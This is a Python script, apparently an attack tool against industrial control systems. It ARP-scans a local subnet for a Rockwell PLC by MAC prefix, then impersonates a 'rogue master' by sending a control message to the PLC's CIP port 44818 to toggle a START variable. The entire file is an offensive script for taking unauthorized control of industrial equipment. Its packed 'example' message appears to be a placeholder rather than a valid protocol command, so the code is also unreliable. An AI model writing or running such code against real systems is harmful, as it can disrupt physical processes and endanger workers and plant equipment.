import socket
import struct
from scapy.all import ARP, Ether, srp

# Function to discover the PLC's IP address
def discover_plc_ip():
    print("Scanning network for PLC...")
    # Define the ARP request packet
    arp = ARP(pdst="192.168.1.0/24")  # Adjust the subnet as needed
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    # Send the packet and receive the response
    result = srp(packet, timeout=2, verbose=0)[0]

    # Parse the response to find the PLC
    plc_ip = None
    for sent, received in result:
        if received.hwsrc.lower().startswith("00:00:bc"):  # Rockwell MAC prefix
            plc_ip = received.psrc
            print(f"Found PLC at IP: {plc_ip}")
            break

    if not plc_ip:
        print("PLC not found on the network.")
    return plc_ip

# Function to impersonate the master and send control messages
def rogue_master(plc_ip):
    print(f"Setting up rogue master to PLC at {plc_ip}...")
    try:
        # Create a socket connection to the PLC
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, 44818))  # Rockwell CIP port

        # Construct a malicious control message (example: toggle START variable)
        message = struct.pack("!BBBBH", 0x65, 0x00, 0x04, 0x00, 0x01)  # Example CIP message
        sock.send(message)

        print("Control message sent successfully.")
        sock.close()
    except Exception as e:
        print(f"Failed to send control message: {e}")

# Main script execution
if __name__ == "__main__":
    plc_ip = discover_plc_ip()
    if plc_ip:
        rogue_master(plc_ip)